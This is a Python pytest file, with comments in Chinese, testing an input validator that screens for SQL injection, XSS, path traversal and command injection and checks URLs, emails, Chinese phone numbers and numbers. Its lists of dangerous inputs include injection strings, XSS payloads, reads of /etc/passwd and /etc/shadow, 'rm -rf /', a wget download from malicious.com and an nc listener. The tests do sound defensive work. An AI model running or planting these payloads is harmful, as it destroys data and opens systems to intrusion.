"""
输入验证器测试
"""
import pytest

from neobot.core.utils.input_validator import InputValidator, input_validator


class TestInputValidator:
    """输入验证器测试类"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.validator = InputValidator()

    def test_validate_sql_input_safe(self):
        """测试安全的 SQL 输入"""
        safe_inputs = [
            "hello world",
            "北京天气",
            "123456",
            "python print('hello')",
            "正常查询语句",
        ]
        
        for input_str in safe_inputs:
            result = self.validator.validate_sql_input(input_str)
            assert result is True, f"应该安全: {input_str}"

    def test_validate_sql_input_dangerous(self):
        """测试危险的 SQL 输入"""
        dangerous_inputs = [
            "SELECT * FROM users",
            "DROP TABLE users",
            "'; DELETE FROM users; --",
            "UNION SELECT password FROM users",
            "EXEC xp_cmdshell 'dir'",
            "admin' OR '1'='1",
        ]
        
        for input_str in dangerous_inputs:
            result = self.validator.validate_sql_input(input_str)
            assert result is False, f"应该危险: {input_str}"

    def test_validate_sql_input_with_safe_keywords(self):
        """测试允许安全关键字的 SQL 输入验证"""
        # 允许 SELECT 但不允许 DROP
        result = self.validator.validate_sql_input("SELECT name FROM users", allow_safe_keywords=True)
        assert result is True
        
        result = self.validator.validate_sql_input("DROP TABLE users", allow_safe_keywords=True)
        assert result is False

    def test_validate_xss_input_safe(self):
        """测试安全的 XSS 输入"""
        safe_inputs = [
            "普通文本",
            "<div>正常HTML</div>",
            "用户输入内容",
            "http://example.com",
            "javascript 教程",  # 注意：包含 javascript 但不是攻击
        ]
        
        for input_str in safe_inputs:
            result = self.validator.validate_xss_input(input_str)
            assert result is True, f"应该安全: {input_str}"

    def test_validate_xss_input_dangerous(self):
        """测试危险的 XSS 输入"""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='malicious.com'></iframe>",
            "onclick=alert('xss')",
            "<svg onload=alert('xss')>",
        ]
        
        for input_str in dangerous_inputs:
            result = self.validator.validate_xss_input(input_str)
            assert result is False, f"应该危险: {input_str}"

    def test_validate_path_input_safe(self):
        """测试安全的路径输入"""
        safe_inputs = [
            "data/file.txt",
            "images/avatar.png",
            "config.toml",
            "正常路径",
            "subdir/document.pdf",
        ]
        
        for input_str in safe_inputs:
            result = self.validator.validate_path_input(input_str)
            assert result is True, f"应该安全: {input_str}"

    def test_validate_path_input_dangerous(self):
        """测试危险的路径输入"""
        dangerous_inputs = [
            "../../../etc/passwd",
            "C:\\Windows\\System32\\cmd.exe",
            "/bin/bash",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/shadow",
        ]
        
        for input_str in dangerous_inputs:
            result = self.validator.validate_path_input(input_str)
            assert result is False, f"应该危险: {input_str}"

    def test_validate_command_input_safe(self):
        """测试安全的命令输入"""
        safe_inputs = [
            "echo hello",
            "python print('test')",
            "正常命令",
            "ls -la",  # 注意：包含 ls 但不是攻击
            "git status",
        ]
        
        for input_str in safe_inputs:
            result = self.validator.validate_command_input(input_str)
            assert result is True, f"应该安全: {input_str}"

    def test_validate_command_input_dangerous(self):
        """测试危险的命令输入"""
        dangerous_inputs = [
            "ls; rm -rf /",
            "dir & del *.*",
            "rm -rf /",
            "wget http://malicious.com/backdoor",
            "nc -lvp 4444",
        ]
        
        for input_str in dangerous_inputs:
            result = self.validator.validate_command_input(input_str)
            assert result is False, f"应该危险: {input_str}"

    def test_validate_url_valid(self):
        """测试有效的 URL"""
        valid_urls = [
            "http://example.com",
            "https://github.com",
            "ftp://files.example.com",
            "http://localhost:8080",
            "https://api.example.com/v1/users",
        ]
        
        for url in valid_urls:
            result = self.validator.validate_url(url)
            assert result is True, f"应该有效: {url}"

    def test_validate_url_invalid(self):
        """测试无效的 URL"""
        invalid_urls = [
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "data:text/html,<script>alert('xss')</script>",
            "not-a-url",
            "",
            None,
        ]
        
        for url in invalid_urls:
            if url is None:
                result = self.validator.validate_url("")
            else:
                result = self.validator.validate_url(url)
            assert result is False, f"应该无效: {url}"

    def test_validate_url_with_allowed_schemes(self):
        """测试使用允许的协议列表验证 URL"""
        # 只允许 http 和 https
        result = self.validator.validate_url("http://example.com", allowed_schemes=["http", "https"])
        assert result is True
        
        result = self.validator.validate_url("ftp://example.com", allowed_schemes=["http", "https"])
        assert result is False

    def test_validate_email_valid(self):
        """测试有效的邮箱地址"""
        valid_emails = [
            "user@example.com",
            "test.user@domain.co.uk",
            "name123@sub.domain.com",
            "first.last@company.org",
        ]
        
        for email in valid_emails:
            result = self.validator.validate_email(email)
            assert result is True, f"应该有效: {email}"

    def test_validate_email_invalid(self):
        """测试无效的邮箱地址"""
        invalid_emails = [
            "not-an-email",
            "user@",
            "@domain.com",
            "user@.com",
            "user@domain.",
            "",
            "user@com",
        ]
        
        for email in invalid_emails:
            result = self.validator.validate_email(email)
            assert result is False, f"应该无效: {email}"

    def test_validate_phone_valid(self):
        """测试有效的手机号（中国格式）"""
        valid_phones = [
            "13800138000",
            "13912345678",
            "15098765432",
            "18800001111",
            "19912345678",
        ]
        
        for phone in valid_phones:
            result = self.validator.validate_phone(phone)
            assert result is True, f"应该有效: {phone}"

    def test_validate_phone_invalid(self):
        """测试无效的手机号"""
        invalid_phones = [
            "1234567890",  # 不是1开头
            "1380013800",  # 长度不够
            "23800138000",  # 第二位不是3-9
            "not-a-phone",
            "138001380001",  # 长度太长
            "",
            "01234567890",
        ]
        
        for phone in invalid_phones:
            result = self.validator.validate_phone(phone)
            assert result is False, f"应该无效: {phone}"

    def test_validate_integer_valid(self):
        """测试有效的整数"""
        valid_cases = [
            ("123", None, None, True),
            ("-456", None, None, True),
            ("0", None, None, True),
            ("100", 0, 200, True),
            ("50", 0, 100, True),
            ("-10", -20, 0, True),
        ]
        
        for value, min_val, max_val, expected in valid_cases:
            result = self.validator.validate_integer(value, min_val, max_val)
            assert result == expected, f"应该有效: {value} (min={min_val}, max={max_val})"

    def test_validate_integer_invalid(self):
        """测试无效的整数"""
        invalid_cases = [
            ("not-a-number", None, None, False),
            ("123.45", None, None, False),
            ("", None, None, False),
            ("100", 200, 300, False),  # 小于最小值
            ("400", 0, 300, False),    # 大于最大值
            ("abc123", None, None, False),
        ]
        
        for value, min_val, max_val, expected in invalid_cases:
            result = self.validator.validate_integer(value, min_val, max_val)
            assert result == expected, f"应该无效: {value} (min={min_val}, max={max_val})"

    def test_validate_float_valid(self):
        """测试有效的浮点数"""
        valid_cases = [
            ("123.45", None, None, True),
            ("-78.9", None, None, True),
            ("0.0", None, None, True),
            ("3.14", 0.0, 10.0, True),
            ("7.5", 5.0, 10.0, True),
            ("-2.5", -5.0, 0.0, True),
        ]
        
        for value, min_val, max_val, expected in valid_cases:
            result = self.validator.validate_float(value, min_val, max_val)
            assert result == expected, f"应该有效: {value} (min={min_val}, max={max_val})"

    def test_validate_float_invalid(self):
        """测试无效的浮点数"""
        invalid_cases = [
            ("not-a-float", None, None, False),
            ("", None, None, False),
            ("123.45", 200.0, 300.0, False),  # 小于最小值
            ("400.5", 0.0, 300.0, False),     # 大于最大值
        ]
        
        for value, min_val, max_val, expected in invalid_cases:
            result = self.validator.validate_float(value, min_val, max_val)
            assert result == expected, f"应该无效: {value} (min={min_val}, max={max_val})"

    def test_sanitize_html(self):
        """测试 HTML 清理"""
        test_cases = [
            ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
            ("<div>正常内容</div>", "&lt;div&gt;正常内容&lt;/div&gt;"),
            ("onclick=alert('xss')", "data-click=alert(&#x27;xss&#x27;)"),
            ("javascript:alert('xss')", "data:alert(&#x27;xss&#x27;)"),
            ("", ""),
        ]
        
        for input_str, expected in test_cases:
            result = self.validator.sanitize_html(input_str)
            assert result == expected, f"清理结果不符: {input_str} -> {result}"

    def test_sanitize_sql(self):
        """测试 SQL 清理"""
        test_cases = [
            ("SELECT * FROM users; -- 注释", "SELECT * FROM users "),
            ("DROP TABLE users;", "DROP TABLE users"),
            ("/* 多行注释 */ SELECT * FROM users", " SELECT * FROM users"),
            ("正常SQL语句", "正常SQL语句"),
            ("", ""),
        ]
        
        for input_str, expected in test_cases:
            result = self.validator.sanitize_sql(input_str)
            assert result == expected, f"清理结果不符: {input_str} -> {result}"

    def test_validate_all_default_types(self):
        """测试默认验证类型"""
        input_str = "正常输入"
        results = self.validator.validate_all(input_str)
        
        expected_types = ['sql', 'xss', 'path', 'command']
        for vtype in expected_types:
            assert vtype in results
            assert results[vtype] is True

    def test_validate_all_custom_types(self):
        """测试自定义验证类型"""
        input_str = "user@example.com"
        validation_types = ['email', 'phone', 'url']
        
        results = self.validator.validate_all(input_str, validation_types)
        
        assert 'email' in results and results['email'] is True
        assert 'phone' in results and results['phone'] is False
        assert 'url' in results and results['url'] is False

    def test_global_input_validator_instance(self):
        """测试全局输入验证器实例"""
        assert isinstance(input_validator, InputValidator)
        
        # 测试全局实例的功能
        result = input_validator.validate_sql_input("正常输入")
        assert result is True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])